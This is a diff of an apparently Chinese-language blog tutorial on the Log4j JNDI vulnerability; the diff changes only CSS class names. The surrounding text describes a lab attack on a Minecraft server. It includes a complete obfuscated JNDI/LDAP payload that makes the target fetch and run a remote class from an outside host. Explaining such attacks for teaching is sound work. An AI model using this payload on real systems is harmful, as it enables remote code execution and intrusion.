@@ -181,7 +181,7 @@
 <li>然后把取回来的东西给你</li>
 </ul>
 <p>Log4j 恰好也支持 JNDI 查找：<code>$&#123;jndi:ldap://某个服务器/某个文件&#125;</code></p>
-<h3 id="漏洞的形成：信任链被破坏"><a href="#漏洞的形成：信任链被破坏" class="headerlink" title="漏洞的形成：信任链被破坏"></a>漏洞的形成：信任链被破坏</h3><style>.gmvedjcsndkf{zoom:67%;}</style><img src="/2025/09/02/log4j/log4j_attack_govcertch.jpg" class="gmvedjcsndkf" alt="log4j_attack_govcertch">
+<h3 id="漏洞的形成：信任链被破坏"><a href="#漏洞的形成：信任链被破坏" class="headerlink" title="漏洞的形成：信任链被破坏"></a>漏洞的形成：信任链被破坏</h3><style>.ypelpyisbmqj{zoom:67%;}</style><img src="/2025/09/02/log4j/log4j_attack_govcertch.jpg" class="ypelpyisbmqj" alt="log4j_attack_govcertch">
 
 <p><strong>正常情况下应该是这样的：</strong></p>
 <ol>
@@ -206,7 +206,7 @@
 <li>目标服务器（Ubuntu）：2.2.2.2（运行 Minecraft）</li>
 <li>防火墙：3.3.3.3</li>
 </ul>
-<style>.mszoyiiwlnnl{zoom: 50%;}</style><img src="/2025/09/02/log4j/image-20250902223922659.png" class="mszoyiiwlnnl" alt="image-20250902223922659">
+<style>.ehzvxxwmscby{zoom: 50%;}</style><img src="/2025/09/02/log4j/image-20250902223922659.png" class="ehzvxxwmscby" alt="image-20250902223922659">
 
 <h3 id="第一步：确认漏洞存在"><a href="#第一步：确认漏洞存在" class="headerlink" title="第一步：确认漏洞存在"></a>第一步：确认漏洞存在</h3><p><strong>攻击者操作：</strong></p>
 <ol>
@@ -264,7 +264,7 @@
 <p><strong>3. 隐藏类名：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原来：Log4jRCE</span><br><span class="line">现在：Lo$&#123;sys:NONEXIST:-g&#125;4jRCE</span><br><span class="line">解释：读取不存在的系统变量，默认返回&quot;g&quot;，拼成&quot;Log4jRCE&quot;</span><br></pre></td></tr></table></figure>
 
-<h3 id="混淆载荷攻击"><a href="#混淆载荷攻击" class="headerlink" title="混淆载荷攻击"></a>混淆载荷攻击</h3><style>.dgtekjxhxunf{zoom:33%;}</style><img src="/2025/09/02/log4j/image-20250902225210809.png" class="dgtekjxhxunf" alt="image-20250902225210809">
+<h3 id="混淆载荷攻击"><a href="#混淆载荷攻击" class="headerlink" title="混淆载荷攻击"></a>混淆载荷攻击</h3><style>.ysaguasgicml{zoom:33%;}</style><img src="/2025/09/02/log4j/image-20250902225210809.png" class="ysaguasgicml" alt="image-20250902225210809">
 
 <p><strong>完整的混淆载荷：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;j$&#123;::-n&#125;d$&#123;::-i&#125;:ld$&#123;date:&#x27;a&#x27;&#125;p://1.1.1.1:995/Lo$&#123;sys:NONEXIST:-g&#125;4jRCE&#125;</span><br></pre></td></tr></table></figure>
